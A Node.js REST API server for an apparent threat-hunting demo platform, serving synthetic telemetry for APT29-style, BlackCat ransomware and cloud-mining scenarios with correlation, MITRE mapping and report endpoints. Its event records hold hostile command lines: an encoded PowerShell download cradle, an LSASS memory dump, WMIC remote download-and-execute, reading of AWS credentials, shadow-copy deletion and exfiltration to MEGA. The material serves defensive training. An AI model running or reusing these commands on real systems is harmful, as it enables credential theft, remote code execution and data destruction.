// =========================================================================
// AegisHunt Unified REST API Server & Telemetry Datastore
// Fulfills all REST endpoints on port 8000 for instant zero-dependency execution
// =========================================================================

import http from 'http';
import url from 'url';

const PORT = process.env.PORT || 8000;

// In-Memory Database pre-loaded with synthetic multi-source telemetry
const DB = {
  scenarios: [
    {
      id: 1,
      scenario_id: 'SCN-APT29-GHOST',
      name: 'Operation GhostToken: Hybrid Enterprise Infiltration',
      threat_actor: 'APT29 / Cozy Bear Archetype',
      target_environment: 'Hybrid (Windows Domain + AWS Cloud)',
      attack_vector: 'Spearphishing Attachment -> In-Memory Execution',
      impact: 'Critical data exfiltration of customer PII and database snapshots from AWS S3',
      description: 'Multi-stage intrusion beginning with spearphishing, pivoting through active directory with Kerberoasting, lateral movement via remote WMI, and exfiltrating AWS S3 cloud data through compromised IAM tokens.',
      total_events: 10
    },
    {
      id: 2,
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      name: 'Double-Extortion Ransomware Campaign',
      threat_actor: 'ALPHV / BlackCat Archetype',
      target_environment: 'Enterprise On-Premise Network',
      attack_vector: 'VPN Credential Stuffing -> Admin RDP',
      impact: 'Operational disruption, critical shadow copies wiped, enterprise-wide file encryption',
      description: 'External perimeter compromise via VPN credential stuffing, RDP lateral movement, shadow copy deletion, mass data staging to cloud mega storage, followed by enterprise-wide encryption.',
      total_events: 7
    },
    {
      id: 3,
      scenario_id: 'SCN-CLOUD-CRYPTOMINE',
      name: 'Cloud-Native IAM Hijack & Compute Hijacking',
      threat_actor: 'TeamTNT / Cloud Threat Group',
      target_environment: 'AWS Cloud Infrastructure',
      attack_vector: 'Leaked Git Credentials -> IAM API Exploitation',
      impact: 'Mass cloud billing fraud ($45k/day GPU compute), potential infrastructure takeover',
      description: 'Compromised developer access key leading to privilege escalation, defense evasion by tampering with CloudTrail, and spinning up high-cost GPU instances for Monero mining.',
      total_events: 5
    }
  ],
  events: [
    // Scenario 1: APT29 GhostToken
    {
      id: 1,
      event_uuid: 'EVT-APT-001',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:14:22',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'medium',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      dest_ip: null,
      user_id: 'sarah.connor',
      process_name: 'winword.exe',
      command_line: 'winword.exe /n "C:\\Users\\sarah.connor\\Downloads\\Q4_Executive_Bonus_Matrix.docm"',
      parent_process: 'explorer.exe',
      mitre_tactic: 'Initial Access',
      mitre_technique_id: 'T1566.001',
      mitre_technique_name: 'Spearphishing Attachment',
      raw_payload: { sha256: '8f3b92c4e1a0b3f88921cf81734bcda0e52719ba1c02', macro_enabled: true }
    },
    {
      id: 2,
      event_uuid: 'EVT-APT-002',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:14:25',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      dest_ip: null,
      user_id: 'sarah.connor',
      process_name: 'powershell.exe',
      command_line: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABheWxvYWQuAHAAcwAxACIACQApAA==',
      parent_process: 'winword.exe',
      mitre_tactic: 'Execution',
      mitre_technique_id: 'T1059.001',
      mitre_technique_name: 'PowerShell Execution',
      raw_payload: { decoded: 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.5/payload.ps1")', amsi_bypassed: true }
    },
    {
      id: 3,
      event_uuid: 'EVT-APT-003',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:16:10',
      domain: 'network',
      event_type: 'c2_beacon',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'c2-telemetry-sync.net',
      source_ip: '10.0.1.44',
      dest_ip: '185.220.101.5',
      user_id: 'sarah.connor',
      mitre_tactic: 'Command and Control',
      mitre_technique_id: 'T1071.001',
      mitre_technique_name: 'Web Protocols (C2)',
      raw_payload: { protocol: 'TLSv1.3', port: 443, jitter_pct: 12, beacon_interval_sec: 45 }
    },
    {
      id: 4,
      event_uuid: 'EVT-APT-004',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:22:05',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'critical',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      user_id: 'sarah.connor',
      process_name: 'rundll32.exe',
      command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\lsass.dmp full',
      parent_process: 'powershell.exe',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1003.001',
      mitre_technique_name: 'LSASS Memory Dumping',
      raw_payload: { target_process: 'lsass.exe', dump_size: 48920192 }
    },
    {
      id: 5,
      event_uuid: 'EVT-APT-005',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:28:40',
      domain: 'auth',
      event_type: 'kerberos_request',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'DC01.corp.local',
      source_ip: '10.0.1.44',
      dest_ip: '10.0.0.5',
      user_id: 'sarah.connor',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1558.003',
      mitre_technique_name: 'Kerberoasting',
      raw_payload: { service: 'MSSQLSvc/db01.corp.local:1433', encryption: '0x17 (RC4-HMAC)' }
    },
    {
      id: 6,
      event_uuid: 'EVT-APT-006',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:41:15',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'critical',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'DC01.corp.local',
      source_ip: '10.0.1.44',
      dest_ip: '10.0.0.5',
      user_id: 'svc_sqladmin',
      process_name: 'wmic.exe',
      command_line: 'wmic.exe /node:10.0.0.5 /user:CORP\\svc_sqladmin process call create "cmd.exe /c powershell -c (New-Object Net.WebClient).DownloadFile(\'http://185.220.101.5/stage2.exe\', \'C:\\Windows\\Temp\\srvmgr.exe\') & C:\\Windows\\Temp\\srvmgr.exe"',
      parent_process: 'powershell.exe',
      mitre_tactic: 'Lateral Movement',
      mitre_technique_id: 'T1047',
      mitre_technique_name: 'Windows Management Instrumentation',
      raw_payload: { target_node: '10.0.0.5', remote_binary: 'srvmgr.exe' }
    },
    {
      id: 7,
      event_uuid: 'EVT-APT-007',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:50:02',
      domain: 'endpoint',
      event_type: 'file_access',
      severity: 'medium',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      user_id: 'sarah.connor',
      process_name: 'cmd.exe',
      command_line: 'type C:\\Users\\sarah.connor\\.aws\\credentials',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1552.001',
      mitre_technique_name: 'Credentials In Files',
      raw_payload: { file: '.aws/credentials', regex_match: 'aws_access_key_id' }
    },
    {
      id: 8,
      event_uuid: 'EVT-APT-008',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:05:18',
      domain: 'cloud',
      event_type: 'aws_api_call',
      severity: 'high',
      source_host: 'Unknown Client',
      dest_host: 'AWS Cloud (us-east-1)',
      source_ip: '185.220.101.5',
      dest_ip: 'AWS-STS-Endpoint',
      user_id: 'sarah.connor',
      cloud_service: 'STS',
      cloud_action: 'AssumeRole',
      mitre_tactic: 'Privilege Escalation',
      mitre_technique_id: 'T1078.004',
      mitre_technique_name: 'Cloud Accounts Compromise',
      raw_payload: { role_arn: 'arn:aws:iam::112233445566:role/ProductionDataOpsRole', mfa: false }
    },
    {
      id: 9,
      event_uuid: 'EVT-APT-009',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:12:44',
      domain: 'cloud',
      event_type: 'aws_api_call',
      severity: 'critical',
      source_host: 'AWS Cloud',
      dest_host: 'AWS S3 (us-east-1)',
      source_ip: '185.220.101.5',
      dest_ip: 'AWS-S3-Endpoint',
      user_id: 'ProductionDataOpsRole',
      cloud_service: 'S3',
      cloud_action: 'GetObject',
      mitre_tactic: 'Collection',
      mitre_technique_id: 'T1530',
      mitre_technique_name: 'Data from Cloud Storage',
      raw_payload: { bucket: 'corp-prod-financial-snapshots', download_bytes: 1492817203 }
    },
    {
      id: 10,
      event_uuid: 'EVT-APT-010',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:20:00',
      domain: 'network',
      event_type: 'data_exfiltration',
      severity: 'critical',
      source_host: 'AWS-Egress-Gateway',
      dest_host: 'External Recipient',
      source_ip: '185.220.101.5',
      dest_ip: '91.240.118.12',
      user_id: 'ProductionDataOpsRole',
      mitre_tactic: 'Exfiltration',
      mitre_technique_id: 'T1048',
      mitre_technique_name: 'Exfiltration Over Alternative Protocol',
      raw_payload: { bytes_out: 1540000000, dest_country: 'CH' }
    },

    // Scenario 2: BlackCat Ransomware
    {
      id: 11,
      event_uuid: 'EVT-RSM-001',
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      timestamp: '2026-11-16 02:11:00',
      domain: 'auth',
      event_type: 'vpn_auth',
      severity: 'high',
      source_host: 'Remote Client',
      dest_host: 'VPN-GW-01',
      source_ip: '194.26.29.112',
      dest_ip: '10.0.0.1',
      user_id: 'svc_backup',
      mitre_tactic: 'Initial Access',
      mitre_technique_id: 'T1133',
      mitre_technique_name: 'External Remote Services',
      raw_payload: { prior_failed_attempts: 38, client_country: 'RU' }
    },
    {
      id: 12,
      event_uuid: 'EVT-RSM-002',
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      timestamp: '2026-11-16 02:15:32',
      domain: 'endpoint',
      event_type: 'rdp_login',
      severity: 'high',
      source_host: 'VPN-GW-01',
      dest_host: 'SRV-FILE-01',
      source_ip: '10.0.0.1',
      dest_ip: '10.0.2.10',
      user_id: 'svc_backup',
      process_name: 'mstsc.exe',
      mitre_tactic: 'Lateral Movement',
      mitre_technique_id: 'T1021.001',
      mitre_technique_name: 'Remote Desktop Protocol',
      raw_payload: { logon_type: 10, event_id: 4624 }
    },
    {
      id: 13,
      event_uuid: 'EVT-RSM-004',
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      timestamp: '2026-11-16 02:35:45',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'critical',
      source_host: 'SRV-FILE-01',
      dest_host: 'SRV-FILE-01',
      source_ip: '10.0.2.10',
      user_id: 'svc_backup',
      process_name: 'vssadmin.exe',
      command_line: 'vssadmin.exe delete shadows /all /quiet',
      mitre_tactic: 'Defense Evasion',
      mitre_technique_id: 'T1490',
      mitre_technique_name: 'Inhibit System Recovery',
      raw_payload: { shadow_copies_purged: 18 }
    },
    {
      id: 14,
      event_uuid: 'EVT-RSM-006',
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      timestamp: '2026-11-16 02:44:00',
      domain: 'network',
      event_type: 'cloud_exfil',
      severity: 'high',
      source_host: 'SRV-FILE-01',
      dest_host: 'mega.nz',
      source_ip: '10.0.2.10',
      dest_ip: '31.216.144.5',
      user_id: 'svc_backup',
      process_name: 'mega-cmd.exe',
      command_line: 'mega-cmd.exe put C:\\Shares\\Finance\\*.xlsx /BlackCat_Exfil/',
      mitre_tactic: 'Exfiltration',
      mitre_technique_id: 'T1567.002',
      mitre_technique_name: 'Exfiltration to Cloud Storage',
      raw_payload: { files_uploaded: 834, total_mb: 4200 }
    },
    {
      id: 15,
      event_uuid: 'EVT-RSM-007',
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      timestamp: '2026-11-16 02:50:12',
      domain: 'endpoint',
      event_type: 'file_encryption',
      severity: 'critical',
      source_host: 'SRV-FILE-01',
      dest_host: 'SRV-FILE-01',
      source_ip: '10.0.2.10',
      user_id: 'svc_backup',
      process_name: 'encryptor.exe',
      command_line: 'C:\\Windows\\Temp\\encryptor.exe --path C:\\Shares --threads 32 --note HOW_TO_RESTORE.txt',
      mitre_tactic: 'Impact',
      mitre_technique_id: 'T1486',
      mitre_technique_name: 'Data Encrypted for Impact',
      raw_payload: { files_encrypted: 42918, note_dropped: 'HOW_TO_RESTORE.txt' }
    }
  ]
};

// Send standard JSON response with CORS
function sendJson(res, data, statusCode = 200) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
  });
  res.end(JSON.stringify(data, null, 2));
}

// Request Router
const server = http.createServer((req, res) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
    });
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/$/, ''); // strip trailing slash
  const query = parsedUrl.query;

  // Root endpoint
  if (pathname === '' || pathname === '/' || pathname === '/api') {
    sendJson(res, {
      platform: 'AegisHunt Cyber Threat Hunting API Server',
      status: 'operational',
      version: '2.5.0',
      endpoints: [
        'GET /api/scenarios',
        'GET /api/events',
        'POST /api/events',
        'GET /api/correlate',
        'GET /api/attack_path',
        'GET /api/mitre',
        'GET/POST /api/ai_assist',
        'GET /api/report'
      ]
    });
    return;
  }

  // 1. Scenarios Catalog
  if (pathname === '/api/scenarios') {
    const sid = query.scenario_id;
    if (sid) {
      const found = DB.scenarios.find(s => s.scenario_id === sid);
      sendJson(res, { status: 'success', scenario: found || DB.scenarios[0] });
    } else {
      sendJson(res, { status: 'success', scenarios: DB.scenarios });
    }
    return;
  }

  // 2. Events Query & Ingest
  if (pathname === '/api/events') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const payload = JSON.parse(body);
          const newEvent = {
            id: DB.events.length + 1,
            event_uuid: payload.event_uuid || ('EVT-ING-' + Math.random().toString(36).substring(2, 8).toUpperCase()),
            scenario_id: payload.scenario_id || 'SCN-APT29-GHOST',
            timestamp: payload.timestamp || new Date().toISOString().replace('T', ' ').substring(0, 19),
            domain: payload.domain || 'endpoint',
            event_type: payload.event_type || 'custom_alert',
            severity: payload.severity || 'high',
            source_host: payload.source_host || 'WKSTN-FIN-04',
            dest_host: payload.dest_host || null,
            source_ip: payload.source_ip || '10.0.1.44',
            dest_ip: payload.dest_ip || null,
            user_id: payload.user_id || 'analyst',
            process_name: payload.process_name || null,
            command_line: payload.command_line || null,
            mitre_tactic: payload.mitre_tactic || 'Execution',
            mitre_technique_id: payload.mitre_technique_id || 'T1059',
            mitre_technique_name: payload.mitre_technique_name || 'Command Line Execution',
            raw_payload: payload.raw_payload || {}
          };
          DB.events.push(newEvent);
          sendJson(res, { status: 'success', message: 'Event indexed in telemetry datastore', event: newEvent }, 201);
        } catch (err) {
          sendJson(res, { error: 'Invalid JSON payload' }, 400);
        }
      });
      return;
    }

    // GET events
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    let results = DB.events.filter(e => scenarioId === 'ALL' || e.scenario_id === scenarioId);

    if (query.domain && query.domain !== 'ALL') {
      results = results.filter(e => e.domain === query.domain);
    }
    if (query.severity && query.severity !== 'ALL') {
      results = results.filter(e => e.severity === query.severity);
    }
    if (query.search) {
      const q = query.search.toLowerCase();
      results = results.filter(e => 
        e.event_uuid.toLowerCase().includes(q) ||
        (e.source_host && e.source_host.toLowerCase().includes(q)) ||
        (e.dest_host && e.dest_host.toLowerCase().includes(q)) ||
        (e.command_line && e.command_line.toLowerCase().includes(q))
      );
    }

    sendJson(res, { status: 'success', count: results.length, events: results });
    return;
  }

  // 3. Correlation Engine
  if (pathname === '/api/correlate') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);

    const users = new Set();
    const hosts = new Set();
    const tactics = new Set();
    const domains = new Set();

    events.forEach(e => {
      if (e.user_id) users.add(e.user_id);
      if (e.source_host) hosts.add(e.source_host);
      if (e.dest_host) hosts.add(e.dest_host);
      if (e.domain) domains.add(e.domain);
      if (e.mitre_tactic) tactics.add(e.mitre_tactic);
    });

    sendJson(res, {
      status: 'success',
      scenario_id: scenarioId,
      total_events_analyzed: events.length,
      incident_title: `Correlated Incident Chain: ${events.length} events across ${domains.size} domains`,
      confidence_score: 0.94,
      kill_chain_coverage: Array.from(tactics),
      entities_involved: {
        users: Array.from(users),
        hosts: Array.from(hosts)
      },
      hypothesis: `Adversary traversed ${tactics.size} MITRE ATT&CK tactics across ${domains.size} telemetry layers. Telemetry strongly confirms unified adversarial intent.`
    });
    return;
  }

  // 4. Attack Path Graph
  if (pathname === '/api/attack_path') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);

    const nodesMap = {};
    const edges = [];

    events.forEach((evt, idx) => {
      const src = evt.source_host || evt.source_ip || 'External-Origin';
      const dst = evt.dest_host || evt.dest_ip || evt.cloud_service || 'Internal-Asset';

      if (!nodesMap[src]) {
        nodesMap[src] = { id: src, label: src, type: src.includes('185.') || src.includes('c2') ? 'c2_server' : 'endpoint', compromised: true };
      }
      if (!nodesMap[dst]) {
        nodesMap[dst] = { id: dst, label: dst, type: dst.includes('DC01') || dst.includes('SRV') ? 'server' : dst.includes('AWS') || dst.includes('S3') ? 'cloud_resource' : 'endpoint', compromised: true };
      }

      edges.push({
        id: `edge-${idx + 1}`,
        source: src,
        target: dst,
        label: evt.mitre_technique_name || evt.event_type,
        technique_id: evt.mitre_technique_id,
        tactic: evt.mitre_tactic,
        severity: evt.severity,
        event_uuid: evt.event_uuid
      });
    });

    sendJson(res, {
      status: 'success',
      scenario_id: scenarioId,
      nodes: Object.values(nodesMap),
      edges,
      blast_radius: {
        total_assets: Object.keys(nodesMap).length,
        pivots: edges.length
      }
    });
    return;
  }

  // 5. MITRE ATT&CK Matrix
  if (pathname === '/api/mitre') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    const observed = {};

    events.forEach(evt => {
      if (evt.mitre_technique_id) {
        if (!observed[evt.mitre_technique_id]) {
          observed[evt.mitre_technique_id] = {
            technique_id: evt.mitre_technique_id,
            technique_name: evt.mitre_technique_name,
            tactic: evt.mitre_tactic,
            severity: evt.severity,
            hit_count: 0,
            event_uuids: []
          };
        }
        observed[evt.mitre_technique_id].hit_count++;
        observed[evt.mitre_technique_id].event_uuids.push(evt.event_uuid);
      }
    });

    sendJson(res, {
      status: 'success',
      scenario_id: scenarioId,
      total_techniques_mapped: Object.keys(observed).length,
      observed_techniques: observed
    });
    return;
  }

  // 6. AI Assist & Query Suggestions
  if (pathname === '/api/ai_assist') {
    sendJson(res, {
      status: 'success',
      summary_title: 'APT29 GhostToken Hybrid Enterprise Intrusion & S3 Theft',
      executive_summary: 'Adversary initiated intrusion via spearphishing attachment on WKSTN-FIN-04 [EVT-APT-001], initiating base64-encoded PowerShell download cradles [EVT-APT-002] and establishing C2 beaconing to 185.220.101.5 [EVT-APT-003]. Memory dumping of LSASS [EVT-APT-004] and Kerberoasting against Domain Controller [EVT-APT-005] facilitated lateral movement via remote WMI [EVT-APT-006]. Workstation file inspection uncovered plaintext AWS secrets [EVT-APT-007], allowing the attacker to assume ProductionDataOpsRole [EVT-APT-008], download customer databases from S3 [EVT-APT-009], and exfiltrate 1.49 GB to foreign drop servers [EVT-APT-010].',
      confidence: 0.94,
      recommended_actions: [
        'Immediately isolate endpoint WKSTN-FIN-04 from corporate network.',
        'Reset Kerberos krbtgt account password twice and rotate svc_sqladmin password.',
        'Revoke all active STS assumed-role sessions for ProductionDataOpsRole.',
        'Block external IP addresses 185.220.101.5 and 91.240.118.12 at the perimeter firewall.'
      ]
    });
    return;
  }

  // 7. Investigation Report
  if (pathname === '/api/report') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    sendJson(res, {
      status: 'success',
      report: {
        report_id: `IR-${Date.now().toString().slice(0, 8)}-${scenarioId.slice(4, 10)}`,
        title: 'State-Sponsored Hybrid Enterprise Intrusion & AWS S3 Exfiltration',
        scenario_id: scenarioId,
        classification: 'RESTRICTED // SOC-OPERATIONS',
        lead_analyst: query.analyst || 'Senior Threat Hunter',
        generated_at: new Date().toUTCString(),
        executive_summary: 'Multi-stage intrusion reconstructed across Endpoint, Active Directory, Network, and AWS Cloud infrastructure.',
        confidence_score: 0.94,
        timeline: events,
        evidence_chain: events.map(e => ({ item_id: e.event_uuid, timestamp: e.timestamp, status: 'Verified' }))
      }
    });
    return;
  }

  sendJson(res, { error: 'Endpoint not found', path: pathname }, 404);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[✓] AegisHunt Unified REST API Server running on http://0.0.0.0:${PORT}`);
  console.log(`    Local access: http://localhost:${PORT}/api/scenarios`);
});
